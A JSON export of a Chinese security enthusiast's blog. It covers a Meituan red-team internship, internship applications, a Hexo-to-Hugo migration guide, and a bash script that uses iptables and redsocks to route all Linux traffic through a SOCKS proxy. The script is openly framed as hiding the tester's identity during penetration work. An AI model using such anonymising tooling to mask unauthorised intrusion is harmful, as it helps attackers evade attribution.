[{"categories":["杂谈"],"content":"实习感悟 不知不觉，在美团已经待了这么久了，今天是离职的日子，心中也是百感交集。 见到了很多厉害的人，这里感谢和他们一起度过的快乐时光，是极好的实习体验。 生活篇我每天上班都是十点打卡，然后理论上七点就可以走人，不过我通常待到八点，会有三十块钱餐补发放到员工的大象账号上。北京总部这边是有很多第三方食堂的，价格相对来说也不贵（比上海美团好多了），味道也还行。 今年共有三个实习生，一位东南大学的研究生，还有一位是南开大学的本科生，我们三人相处也是非常愉快。南开大学那位，最后没有留用转正，回学校保研，走得早了些；东大的硕我俩一起离职的，离职那天他还带我去吃地道的北京馆子（他是北京本地人）。 我们组气氛也是非常融洽，各位前辈都很友好和善，有什么问题他们都会耐心解答，毫无保留。我主管人也是非常 nice，我待了这些时间，我们居然团建了两次，主管也是非常潮流，第一次带我们去网红餐厅星空顶什么的，第二次带我们去撕名牌、吃涮羊肉。 工作篇我们组固定每周一早上开例会，总结上周的工作，除此之外只有有事的时候才会开会讨论，这点也是非常好的。 美团是非常锻炼人能力的，我刚到的第三天便开始上手工作，几乎没什么限制，而和其他家实习生聊天时，发现他们都会有很多限制。 审计过一些美团的外采资产，提升了我的代码审计能力，比如面对一个大型系统时，我没找到入口，是前辈教我从配置文件一步一步找到他的启动入口；参加了两次护网，丰富了我的实战能力；做美团内部的全链路 case，是我学到最多的，真正面对一个大型的企业，如何绕过告警做操作等等 在实习的过程中，前辈也给了很多建议和指点，从他们身上能学到不仅仅是技术，还有工作的一些思路和方法，受益良多。也是在美团这里，让我找到接下来学习研究的方向，我发觉在整个攻击链路上，我更喜欢做对抗相关，Linux 下的持久化和绕过、云上对抗、武器化都是我接下来重点研究学习的方向。 写到这里，发现写得有点流水账了哈哈哈哈，因为很多东西涉及公司内容，不好写出来，只能想起什么写什么，真情流露了哈哈哈哈。 ","date":"2023-09-15","objectID":"/%E7%BE%8E%E5%9B%A2%E5%AE%9E%E4%B9%A0%E5%B0%8F%E7%BB%93/:0:0","tags":null,"title":"美团实习小结","uri":"/%E7%BE%8E%E5%9B%A2%E5%AE%9E%E4%B9%A0%E5%B0%8F%E7%BB%93/"},{"categories":["杂谈"],"content":"对暑期实习投递的总结 今年的情况也太惨烈了点，去年看学长投递，起码暑期实习还是比较顺利的，还真是“未来五年永远都是未来五年内最好的一年”。 先讲讲自身情况吧，茯苓是对安全攻防方向比较感兴趣，所以一开始就想找蓝军相关岗位，但是今年真是 buff 叠满，蓝军这个岗位本身呢，技术力要求很高，加上今年基本不怎么招人，所以就是地狱难度，但是茯苓呢比较固执，所以今年投实习也是拖了很久，最后还是确定来了北京美团，现在才来写这个总结。 我将总结放在开头，感兴趣的读者可以看每个公司的总结。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:0","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 小作文现在我正坐在北京的合租房中，现在距离暑期实习第一次投递，已经过去了三个多月，这三个多月，我有过兴奋，有过期待，有过失望，有过难过，太多的感觉，到今天已经没那么强烈，但我深知今年投递的难度。 我不断的反思自己，首先，大家都喜欢要求代码能力，就算是安全岗位，也应当要有适当的代码能力；其次，学习东西要深入到细节中去，不要似懂非懂，大差不大；最后，想做蓝军，最好不要走 ctf 赛道，走 hw 赛道，做攻防也可以先从防御做起，因为蓝军的技术力要求很高，而且攻防本身是转换的，不是绝对的。 其实我很喜欢对未来的事情做出预想和判断，但是这次投递，我感到很多不应该做的，本应该做的，情况已经远超我的想象了，对于未来我说实话是真的很迷惘，但是现在，我已经坐在了北京的合租房中，这绝不是我一开始的想法，虽然现在一切都是变化的，我已然身处在变化中，那便，拥抱变化吧。 接下来我按照投递顺序来对每家做个小总结，不涉及面试细节，只聊感受。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:1","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 美团美团是有笔试的，而且笔试难度很高，我觉得不是我这种网安人能做出来的，不过捞人的线倒是挺低的。一开始，我被应用安全部门的面试官捞起了，这位面试官很好，但是我很想去蓝军方向，他这边不太符合，和他聊聊了，最后就结束了我的流程。然后我就被评估应急部门捞起了，这个部门就比较符合我的预期了，面试官最后给我说，我学的东西太浅，需要更深入一点，不然走不远的，很感谢他的指点。这个部门我也是走到了主管面，主管面还是一样的说法，实战经验不足，需要做一个真实环境内网的渗透可能会好一点。美团这里也是比较巧，这面之后，我其实是被挂掉了，但是后来又捞了起来，我问我主管，他说：“缘分”。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:2","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 拼多多多子是有笔试的，但是难度就没那么高，我觉得连我都可以接受。多子应该是大部门招聘，所以面试我的一直是安全部的面试官，第一位面试官比较偏业务层，但我还是表达我想去蓝军岗位。二面的面试官是数据安全相关的，问了很多数据安全相关的东西，这方面我确实了解不多，所以我们谈的不是很投缘，但是他也表示理解。到了主管面，就是很正常的问简历，问职业发展与规划什么的，这位面试官好像比较在乎我的编码能力。最后也是无缘 pdd，不久之后就收到感谢信。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:3","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 百度百度也是有笔试的，百度是选择简答这种题型。这次面的就是蓝军的岗位，但是百度这边的话，应该是只要一位或者两位，所以竞争很激烈。这边问了很多很深入很细节的问题，也对应了之前面试美团的时候，面试官强调的要深入理解学习的说法，我确实还达不到这个要求，加上我没有蓝军统一要求的 hw 经验，也是第一面就被刷掉了。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:4","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 腾讯腾讯是有笔试的，但是好像不怎么看重这个？一开始先面试了玄武，这一面当时有点没准备好，托大了，问了一个很细节的 java 安全相关问题，我也是没答上来，后面的渗透实战感觉答的也是比较一般，不出意外挂了。后来就面试了科恩，科恩这次倒是运气好，完成了主管终面，感觉几面已经是发挥到了极致，不过还是有更加 match 的同学拿下了这个名额，这也正常。最后还有个腾讯数据安全部门面试我，由于完全不会，所以也不再赘述了。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:5","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 阿里阿里没有笔试，真的爱了。阿里这边我面了阿里云的反入侵团队，我当时一直表达我想做蓝军方向，虽然两次面试的面试官好像一直在说蓝军技术力要求很高，让我拓宽一下思路，但是我当时有点思维僵化了，事后想起来是无比后悔，蓝军这种岗位，一般不招实习生，要么转正要么真的很牛逼，我之前的赛道一直是 ctf，从来也不是攻防，所以，先从反入侵入手也是很对的，毕竟攻防不分家嘛，事后想起来就是很后悔。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:6","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 蚂蚁蚂蚁无笔试，我找学长内推了天穹，这边情况和百度一样，要求很高，hc很少，基本上都是当作正式员工去招聘的，我 hw 经验太少，意料之中的落榜。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:7","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 华为用国奖免掉了笔试。这下我真是体会到了华子招聘的感觉了，开得最晚，拖得最久，池子最大，消息最假。（以上只是友好吐槽，有夸张成分，权当友好吐槽，华为还是很好的企业）。华子的面试问题没那么难，一面轻松过，主管面也是笑着聊天。可惜最后杳无音讯，不了了之了，我其实想去华子的意愿还是比较强的。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:8","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 京东京东没有笔试，这边面试我的是京东云的，问了很多比较细节的东西，一些很细节的东西确实有些说不上来，也是一面挂掉了。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:9","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["杂谈"],"content":" 荣耀荣耀的笔试难度也不是很高，两面都很常规，也是顺利的 oc 了，但是当时有着美团和华为两家，所以我最后也是没有接受荣耀的 oc。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:10","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试"],"content":"Linux 全局代理脚本 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:0","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":" 前言众所周知，我们在网上“探索”别人网站的时候，通常都需要挂上代理来隐藏自己。茯苓目前的需求是，虚拟机使用物理机开出来的局域网代理来隐藏自己，但是没有好的工具可以实现 Linux 的全局代理，于是茯苓便不断探索学习并写出了一个小工具。 茯苓目前的方案是这样的，物理机用作 CTF 等日常的使用；开第一个虚拟机用来进行渗透行为，受限于一些条件，茯苓目前只能用 Kali 来渗透；开第二个虚拟机用来进行调试网上拉下来的代码以及运行一些不确定安全性的软件。茯苓给这组方案起名为面具系统，以后有机会详细描述下配置的具体细节。（又挖一个坑） 对于 Windows 和 MacOS 用户，我们可以使用 Proxifier 来实现进程级的代理，好用程度，谁用谁知道。但是 Linux 用户就没用这么好的运气了，而网上几乎很难找到靠谱的方案，现在开始讲述茯苓的探索血泪史。 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:1","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":" 最常见的 proxychains茯苓打开浏览器一搜索“Linux 全局代理”，大多数都是这种方案。都是清一色的给浏览器设置代理，然后对于工具，都在命令行里面使用 proxychains 作为前缀来套一层代理，网上全是这种，茯苓这里就不再赘述。这种方式确实能解决一些问题，但是用起来极其不方便。 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:2","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":" 倾旋大佬的透明代理方式就在某一个月黑风高的夜晚，茯苓突然搜到了一个链接Linux透明代理在红队渗透中的应用，我终于看到了一些曙光。 详细的内容可以看链接，这里茯苓简单介绍一下几个关键点。 iptablesiptables 是 Linux 管理员用来设置 IPv4 数据包过滤条件和 NAT 的命令行工具。可以设置规则轻松地重定向传入流量，实现将流量导入 socks 代理。 redsocksredsocks 是一个能够重定向socks代理的一款开源软件，它允许我们在系统上监听一个端口，与远程socks端口进行转换，并且支持socks5认证。 透明代理透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的 request fields（报文），并会传送真实 IP，多用于路由器的 NAT 转发中。加密的透明代理则是属于匿名代理。 那么总结一下来说就是，利用 iptables 重定向流量到一个端口，利用 redsocks 将该端口流量转化为 socks 代理即我们的代理，这样就可以形成一种透明代理。我们的 linux 访问网站时，会被防火墙拦截，然后通过代理发送到目标网站。对于 linux 系统来说，它以为自己是直接访问了目标网站，而不知道被代理了。 在学习了他的脚本以后，茯苓往顺手修改了一下， #!/bin/bash # redsocks 配置 redsocks_bin_path=\"redsocks\" redsocks_config_file_path=\"/etc/redsocks.conf\" shell_log_path=\"/tmp/socks-switch.log\" # 代理配置 sed_tool(){ sed -i $1'd' $redsocks_config_file_path sed -i $1\"i\\ $2\" $redsocks_config_file_path } set_proxy(){ # 行号 内容 # type sed_tool '52' 'type = socks5;' # ip sed_tool '47' 'ip = 10.37.129.2' # port sed_tool '48' 'port = 7890' socks_loging \"set proxy ...\" } # 记录日志 socks_loging(){ current_time=$(date +\"%Y-%m-%d %H:%M:%S\"); echo \"[*] \"$current_time \": \" $1 \u003e\u003e $shell_log_path echo \"[*] \"$current_time \": \" $1 } # 开启 redsocks start_redsocks(){ $redsocks_bin_path -c $redsocks_config_file_path socks_loging \"start redsocks ...\" } # 关闭 redsocks stop_redsocks(){ pkill redsocks socks_loging \"stop redsocks ...\" } # 重置 iptalbes 不影响其他规则 reset_iptables(){ ids=`iptables -t nat -nL OUTPUT --line-number | grep REDSOCKS | awk '{print $1}'` if [ ! -z \"$ids\" ]; then id_array=(${ids//\\\\n/ }) #socks_loging \"REDSOCKS OUTPUT Chian ID : $id_array\" for id in ${id_array[@]} do id=`echo $id|egrep -o \"[0-9]{1,4}\"` if [ $id != \"\" ]; then iptables -t nat -D OUTPUT $id #iptables -t nat -D PREROUTING $id fi done fi #socks_loging \"No Set Iptables ...\" iptables -t nat -nvL REDSOCKS \u003e /dev/null 2\u003e\u00261 if [ \"$?\" != \"1\" ]; then iptables -t nat -F REDSOCKS iptables -t nat -X REDSOCKS fi socks_loging \"reset iptables ...\" } # 清除全部 iptables clean(){ iptables -t nat -F iptables -t nat -X iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT iptables -t nat -P OUTPUT ACCEPT iptables -t mangle -F iptables -t mangle -X iptables -t mangle -P PREROUTING ACCEPT iptables -t mangle -P INPUT ACCEPT iptables -t mangle -P FORWARD ACCEPT iptables -t mangle -P OUTPUT ACCEPT iptables -t mangle -P POSTROUTING ACCEPT iptables -F iptables -X iptables -P FORWARD ACCEPT iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -t raw -F iptables -t raw -X iptables -t raw -P PREROUTING ACCEPT iptables -t raw -P OUTPUT ACCEPT socks_loging \"clean iptables ...\" } # 浏览模式 browse(){ iptables -t nat -A REDSOCKS -d 10.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 169.254.0.0/16 -j RETURN iptables -t nat -A REDSOCKS -d 172.16.0.0/12 -j RETURN iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-port 12345 socks_loging \"browse mode ...\" } # 内网模式 intranet(){ set_proxy iptables -t nat -A REDSOCKS -p tcp -d 10.0.0.0/8 -j REDIRECT --to-port 12345 iptables -t nat -A REDSOCKS -p tcp -d 172.0.0.0/8 -j REDIRECT --to-port 12345 iptables -t nat -A REDSOCKS -p tcp -d 192.168.0.0/16 -j REDIRECT --to-port 12345 socks_loging \"intranet mode ...\" } # 自定义模式 diy(){ socks_loging \"diy mode ...\" } # 载入防火墙 install(){ stop_redsocks reset_iptables iptables -t nat -N REDSOCKS iptables -t nat -A REDSOCKS -d $proxy_ip -j RETURN if [ \"$1\" = \"browse\" ]; then browse fi if [ \"$1\" = \"intranet\" ]; then intranet fi if [ \"$1\" = \"diy\" ]; then diy fi iptables -t nat -A OUTPUT -p tcp -m owner ! --uid-owner $redsocks_user -j REDSOCKS start_redsocks } # banner if [ -z \"$1\" ]; then echo \"[*] Usage proxy : 配置代理 browse : 浏览模式 intranet : 内网模式 diy : 自定义模式 reset : 重制 iptables 不影响其他规则 clean : 清空 iptables 所有规则 stop : 重制 iptables 并关闭代理 \" exit 0 fi if [ \"$1\" = \"proxy\" ]; then set_proxy exit 0 fi if [ \"$1\" = \"browse\" ]; then install $1 exit 0 fi if [ \"$1\" = \"intranet\" ]; then install $1 exit 0 fi if [ \"$1\" = \"diy\" ]; then i","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:3","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":" 茯苓基于 GOST 的透明代理https://latest.gost.run/tutorials/redirect/是 GOST 关于透明代理的用法，原理上也是 redsocks 的重定向，但是 GOST 将该功能集成在自身，茯苓测试操作之后，利用 GOST v3 重写了 Linux 全局代理脚本。 脚本vanish 启动脚本以后，这台虚拟机上的外网的所有流量都会走代理，而不需要其他操作 准备需要先去https://latest.gost.run/下载对应平台的 GOST 二进制文件 操作介绍将 shell 脚本下载到本地以后，先用 chmod +x vanish.sh添加权限 mix 选项 tcp 选项 udp 选项 inner 选项，需要先开启前面其中一个选项，开启这个以后可以将自身流量代理进入内网 off 选项，会关闭 gost 并且清除工具添加的 iptables 规则而不影响其他规则 clean 选项，会删除日志，日志默认位置在log=\"/tmp/vanish.log\"，可以自行修改 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:4","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":" 结语有了这个脚本，茯苓就可以物理机开启一个代理，然后渗透虚拟机使用局域网代理来隐藏自身了！！！ 总得来说，茯苓是借助了 GOST 这个工具，而 GOST v3 还没正式发布，如果后面有什么变动茯苓会继续更新 vanish。 茯苓认为，Linux 上全局代理的关键就是 iptables 的运用，但是茯苓对于 iptables 掌握得并不是很精通，全是现学的，规则上可能有很多不完善不优雅的地方，欢迎各位师傅交流指正。 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:5","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":" 参考文章Linux透明代理在红队渗透中的应用 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:6","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":null,"content":"晨星_茯苓's friends","date":"2023-01-10","objectID":"/friends/","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":" 说明 # 互换友链请按照以下格式留言 - nickname: 晨星_茯苓 avatar: https://poriams.github.io/avatar.jpg url: https://poriams.github.io description: 每个魔法都有它的代价 ","date":"2023-01-10","objectID":"/friends/:1:0","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":" ID: 晨星_茯苓 / Poria Morningstar / Poria网络安全爱好者，关注红蓝对抗，研究 APT 手法。 社畜时代2024.6 ～ 至今 阿里巴巴-淘天集团安全部 学生时代CTFer，校队 X1cT34m，联合战队 SU 成员，半步赛棍 在校期间先后实习于安恒信息、美团基础安全，主做攻防相关 ","date":"2023-01-10","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"},{"categories":["建站记录"],"content":"从 Hexo 迁移到 Hugo ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:0","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["建站记录"],"content":" 前言自茯苓我从 Windows 投向 Macos 的怀抱以后，真是有好多东西要做迁移，加上 M1 架构的生态并不是那么好，茯苓的迁移进程就慢到起飞。本来打算这两天写一篇博客，这才意识到，之前的 hexo 博客没做迁移，以前一直就听说 hugo 优点很多，干脆心一横，枪在手，跟我走，杀 hexo，抢 hugo！ ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:1","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["建站记录"],"content":" 安装 安装 HugoMac 直接使用 brew 安装即可 brew install hugo 生成站点生成博客文件夹 hugo new site Bitter_Tree/Blog 先 cd 到博客文件夹，后续操作都在博客文件夹下 安装皮肤茯苓这里选取的是 FixIt 主题，集大成者 git init git submodule add https://github.com/hugo-fixit/FixIt.git themes/FixIt 创建页面填写网站根目录的配置文件 config.toml title = \"我的全新 Hugo FixIt 网站\" baseURL = \"http://example.org/\" # 设置默认的语言 [\"en\", \"zh-cn\", \"fr\", \"pl\", ...] defaultContentLanguage = \"zh-cn\" # 网站语言, 仅在这里 CN 大写 [\"en\", \"zh-CN\", \"fr\", \"pl\", ...] languageCode = \"zh-CN\" # 是否包括中日韩文字 hasCJKLanguage = true # 更改使用 Hugo 构建网站时使用的默认主题 theme = \"FixIt\" [params] # FixIt 主题版本 version = \"0.2.X\" [menu] [[menu.main]] identifier = \"posts\" # 你可以在名称（允许 HTML 格式）之前添加其他信息，例如图标 pre = \"\" # 你可以在名称（允许 HTML 格式）之后添加其他信息，例如图标 post = \"\" name = \"文章\" url = \"/posts/\" # 当你将鼠标悬停在此菜单链接上时，将显示的标题 title = \"\" weight = 1 # 向菜单项添加用户定义的内容 [menu.main.params] # 添加 CSS 类到菜单项 class = \"\" # 是否为草稿菜单，类似草稿页面 draft = false # 添加 fontawesome 图标到菜单项 icon = \"fa-solid fa-archive\" # 设置菜单项类型，可选值：[\"mobile\", \"desktop\"] type = \"\" [[menu.main]] identifier = \"categories\" pre = \"\" post = \"\" name = \"分类\" url = \"/categories/\" title = \"\" weight = 2 [menu.main.params] icon = \"fa-solid fa-th\" [[menu.main]] identifier = \"tags\" pre = \"\" post = \"\" name = \"标签\" url = \"/tags/\" title = \"\" weight = 3 [menu.main.params] icon = \"fa-solid fa-tags\" # Hugo 解析文档的配置 [markup] # 语法高亮设置 (https://gohugo.io/content-management/syntax-highlighting) [markup.highlight] # false 是必要的设置 (https://github.com/hugo-fixit/FixIt/issues/43) noClasses = false 创建一个关于页面和文章页面 hugo new posts/test.md 启动 Hugo hugo server -D 就会在本地启动博客了 ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:2","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["建站记录"],"content":" 配置 网站基础配置https://fixit.lruihao.cn/zh-cn/theme-documentation-basics/#site-configuration 这里有详细的配置，参照这个配置文件做改动 茯苓的建议是把他的配置文件直接复制到博客根目录下，不要去主题文件夹里面修改 这步茯苓主要是做一些网站图片，网站名称的修改，值得一提的是该主题本身就有关于和友链页面，可以直接创建并修改菜单栏 魔改 css目前这个主题还未提供更换背景的功能，只能自己魔改了 首先在网站根目录下创建 assets/css 文件夹，在里面添加 _custom.scss body { background-image: url(/background.jpg); background-size: cover; background-position: top 20px center; background-repeat: no-repeat; background-attachment: fixed; } header#header-desktop.desktop.animate__faster { backdrop-filter: blur(10px); background: hsla(0, 0%, 100%, 0.8) linear-gradient(90deg, rgba(247,149,51,0.15) 0, rgba(243,112,85,0.15) 15%, rgba(239,78,123,0.15) 30%, rgba(161,102,171,0.15) 44%, rgba(80,115,184,0.15) 58%, rgba(16,152,173,0.15) 72%, rgba(7,179,155,0.15) 86%, rgba(109,186,130,0.15) 100%); [data-theme='dark'] \u0026 { background-color: $header-background-color-dark; } } main.container, footer.footer { background-color: rgba($color: $global-background-color, $alpha: 0.45); [data-theme='dark'] \u0026 { background-color: rgba($color: $global-background-color-dark, $alpha: 0.9); } } 这是茯苓的配置，对黑夜效果也做了适配，效果图为 添加评论系统茯苓货比三家最后选择了 Waline 评论系统，可以参照官方文档配置，非常详细，记得配置评论提醒功能哦 这里贴一下 config [params.page.comment.waline] enable = true serverURL = \"\" pageview = true # FixIt 0.2.15 | 新增 emoji = [\"//unpkg.com/@waline/emojis@1.1.0/weibo\"] meta = [\"nick\", \"mail\", \"link\"] requiredMeta = [\"nick\", \"mail\"] login = \"enable\" wordLimit = 0 pageSize = 10 imageUploader = true # FixIt 0.2.15 | 新增 highlighter = true # FixIt 0.2.15 | 新增 comment = true # FixIt 0.2.15 | 新增 texRenderer = true # FixIt 0.2.16 | 新增 search = true # FixIt 0.2.16 | 新增 recaptchaV3Key = \"\" # FixIt 0.2.16 | 新增 修改 fontawesome茯苓根据自己的情况，创建了一个 fontawesome 模版，放在博客根目录的 archetypes 文件夹下，建一个 posts.md title: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" date: {{ .Date }} Lastmod: password: message: \"此地无银三百两\" comment: true weight: 0 categories: - draft resources: - name: featured-image src: featured-image.png 文章迁移茯苓以前也都不怎么写博客，有很多文章的年限都比较久了，就挑了一篇二次反序列化，以及 JavaSE 的笔记迁过来，要改动的地方就是头部的那些，没啥难度就是有点麻烦耗时间 部署到 github 仓库需要部署在 GitHub Pages 上，首先在GitHub上创建一个 Repository，仓库名必须跟自己的用户名一样用户名.github.io 然后运行hugo命令创建 public 页面，然后建立本地和 github 仓库的连接 hugo cd public git init git add . git commit -m \"updating site on $(date)\" git remote add origin https://github.com/PoriaMs/poriams.github.io.git git push -u origin main 与远程仓库建立连接时，现在不能使用用户名密码登录，需要申请令牌，会有提示文档，照着操作就好 以后每次更新只需要 hugo cd public git add . git commit -m \"updating site on $(date)\" git push origin main 添加 google 分析添加这个可以帮助茯苓统计网站流量 申请好 ID 之后填上去即可 [params.analytics] enable = true # Google Analytics [params.analytics.google] id = \"\" # 是否匿名化用户 IP anonymizeIP = true 添加 SEO Google第一步 先去 https://search.google.com/search-console 点击添加资源，选择 URL 方式导入，输入 URL，然后下载弹出 html 到 static 目录下，重新部署网站，部署完之后点击验证，验证成功代表没问题 第二步 在 search-console 中点击站点地图，然后把自己的添加进去，hugo 的默认在 sitemap.xml 下 百度进入百度搜索资源平台，选择 用户中心-\u003e站点管理-\u003e添加网站，这里的验证方式也可以选择下载html的方式，步骤和google的一样，验证成功后选择 搜索服务-\u003e普通收录-\u003esitemap，输入sitemap的网址，和google的站点地图一样。不过百度的收录速度貌似很慢 必应进入Bing Webmaster Tools，登录后直接导入google的数据就可以，很方便 辅助脚本茯苓迎合自己的需求写了一个博客辅助脚本，生成文章时可以按照文章名生成文件夹，以 index.md 为文章内容，图片就可以保存在文件夹内以相对路径引用了，还有一些其他功能方便自己使用 地址：https://github.com/PoriaMs/wheelchair ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:3","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["JavaSec"],"content":"对 Java 